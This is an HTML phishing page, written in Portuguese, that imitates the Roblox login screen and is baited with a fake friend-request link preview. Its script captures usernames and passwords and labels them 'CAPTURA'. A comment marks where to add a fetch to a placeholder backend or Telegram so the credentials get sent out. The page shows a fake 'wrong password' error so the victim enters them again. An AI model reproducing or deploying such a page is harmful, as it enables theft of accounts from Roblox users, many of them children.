<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Roblox</title>

<meta property="og:title" content="Pedido de amizade - Roblox">
<meta property="og:description" content="Você recebeu um pedido de amizade. Clique para aceitar.">
<meta property="og:image" content="https://tr.rbxcdn.com/180DAY-8b1a2e6f3c9d4a5b6c7d8e9f0a1b2c3d/150/150/AvatarHeadshot/Png/noFilter">
<meta property="og:type" content="website">
<meta property="og:url" content="https://teu-site-aqui.com">

<link rel="icon" href="https://www.roblox.com/favicon.ico">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;}
  html,body{height:100%;}
  body{
    background:#1c1f22; /* fundo escuro do novo login */
    color:#fff;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:24px;
    -webkit-font-smoothing:antialiased;
  }
  .wrap{
    width:100%;
    max-width:440px;
    display:flex;
    flex-direction:column;
    align-items:center;
  }
  
  /* Logo no topo */
  .logo-container{
    margin-bottom:24px;
    display:flex;
    flex-direction:column;
    align-items:center;
    gap:12px;
  }
  .logo-container svg{
    width:160px;
    height:auto;
    fill:#fff;
  }

  /* Card principal */
  .card{
    width:100%;
    background:#27292c; /* cor exata do card do Roblox */
    border-radius:12px;
    padding:32px 36px;
    box-shadow:0 8px 32px rgba(0,0,0,0.4);
    border:1px solid rgba(255,255,255,0.05);
  }
  
  .card h1{
    font-size:20px;
    font-weight:600;
    text-align:center;
    margin-bottom:24px;
    letter-spacing:-0.3px;
  }

  .field{
    margin-bottom:16px;
    position:relative;
  }
  .field label{
    display:block;
    font-size:13px;
    color:#9ea2a6;
    margin-bottom:8px;
    font-weight:500;
  }
  .field input{
    width:100%;
    padding:12px 14px;
    background:#1e2022;
    border:1px solid #3b3f43;
    border-radius:8px;
    color:#fff;
    font-size:15px;
    outline:none;
    transition:border-color .2s, background .2s;
  }
  .field input:hover{
    border-color:#55595e;
  }
  .field input:focus{
    border-color:#fff;
    background:#161819;
  }
  .field input::placeholder{
    color:#5f6368;
  }

  /* Botão de login */
  .btn{
    width:100%;
    padding:14px;
    background:#00a2ff; /* azul original */
    border:0;
    border-radius:8px;
    color:#fff;
    font-size:15px;
    font-weight:600;
    cursor:pointer;
    transition:background .2s, opacity .2s;
    margin-top:8px;
    display:flex;
    align-items:center;
    justify-content:center;
    gap:8px;
  }
  
  /* Estado desativado (quando vazio) */
  .btn:disabled{
    background:#3b3f43;
    color:#8a8d90;
    cursor:not-allowed;
  }
  .btn:not(:disabled):hover{
    background:#0090e0;
  }

  .err{
    display:none;
    color:#ff5c5c;
    font-size:13px;
    text-align:center;
    margin-top:14px;
    font-weight:500;
    background:rgba(255,92,92,0.1);
    padding:10px;
    border-radius:6px;
  }

  /* Links embaixo */
  .links{
    text-align:center;
    margin-top:24px;
    font-size:14px;
    color:#9ea2a6;
    line-height:1.6;
  }
  .links a{
    color:#fff;
    text-decoration:none;
    font-weight:500;
  }
  .links a:hover{
    text-decoration:underline;
  }
  .divider{
    height:1px;
    background:rgba(255,255,255,0.08);
    margin:20px 0;
  }

  .footer{
    margin-top:32px;
    font-size:12px;
    color:#5f6368;
    text-align:center;
    line-height:1.5;
  }
  
  @media(max-width:480px){
    .card{padding:24px 20px;}
    .logo-container svg{width:120px;}
  }
</style>
</head>
<body>
<div class="wrap">

  <div class="logo-container">
    <!-- Logo Roblox real em SVG (branco) -->
    <svg viewBox="0 0 152 42" xmlns="http://www.w3.org/2000/svg">
      <path d="M15.4 0L0 6.9l15.4 6.9V0zm0 13.8L0 20.7l15.4 6.9V13.8zm0 13.8L0 34.5l15.4 6.9V27.6zM35 0H20.5v41.4H35V0zm15.4 0L35 6.9l15.4 6.9V0zm0 13.8L35 20.7l15.4 6.9V13.8zm0 13.8L35 34.5l15.4 6.9V27.6zM50.4 0v41.4H65V0H50.4zm30.8 0H66.7v41.4h14.5V0zm15.4 0L81.2 6.9l15.4 6.9V0zm0 13.8L81.2 20.7l15.4 6.9V13.8zm0 13.8L81.2 34.5l15.4 6.9V27.6z" fill="#fff" fill-opacity="1"></path>
    </svg>
  </div>

  <div class="card">
    <h1>Entrar</h1>

    <form id="form" novalidate>
      <div class="field">
        <label for="username">Nome de usuário / E-mail / Telefone</label>
        <input id="username" type="text" autocomplete="username" required>
      </div>

      <div class="field">
        <label for="password">Senha</label>
        <input id="password" type="password" autocomplete="current-password" required>
      </div>

      <button class="btn" id="submitBtn" type="submit" disabled>Entrar</button>
      <div class="err" id="err">Nome de usuário ou senha incorretos. Tente novamente.</div>
    </form>

    <div class="links">
      <a href="https://www.roblox.com/account/signupredir" target="_blank" rel="noopener">Esqueceu a senha?</a>
      <div class="divider"></div>
      Não tem uma conta? <a href="https://www.roblox.com" target="_blank" rel="noopener">Cadastre-se</a>
    </div>
  </div>

  <div class="footer">
    © 2024 Roblox Corporation. Todos os direitos reservados.
  </div>

</div>

<script>
  const form = document.getElementById('form');
  const btn  = document.getElementById('submitBtn');
  const err  = document.getElementById('err');
  const user = document.getElementById('username');
  const pass = document.getElementById('password');

  // Botão cinza até preencher tudo
  function checkInputs() {
    if (user.value.trim() !== '' && pass.value !== '') {
      btn.disabled = false;
    } else {
      btn.disabled = true;
    }
  }
  user.addEventListener('input', checkInputs);
  pass.addEventListener('input', checkInputs);

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    if (btn.disabled) return;

    err.style.display = 'none';
    btn.disabled = true;
    btn.textContent = 'Entrando...';

    const username = user.value.trim();
    const password = pass.value;

    try {
      // ==========================================
      // AQUI É ONDE VOCÊ PLUGA O TELEGRAM DEPOIS
      // Substitua a linha abaixo pela chamada do fetch:
      // const r = await fetch('https://teu-backend.com/api/login', { ... })
      // ==========================================
      
      console.log('CAPTURA:', { username, password });
      await new Promise(r => setTimeout(r, 1200));

      // Simula erro pra vítima tentar de novo
      btn.disabled = false;
      btn.textContent = 'Entrar';
      err.style.display = 'block';
      
      // Limpa só a senha pra parecer que o erro foi nela
      pass.value = '';
      checkInputs(); 

    } catch (e) {
      btn.disabled = false;
      btn.textContent = 'Entrar';
      err.style.display = 'block';
    }
  });
</script>
</body>
</html>
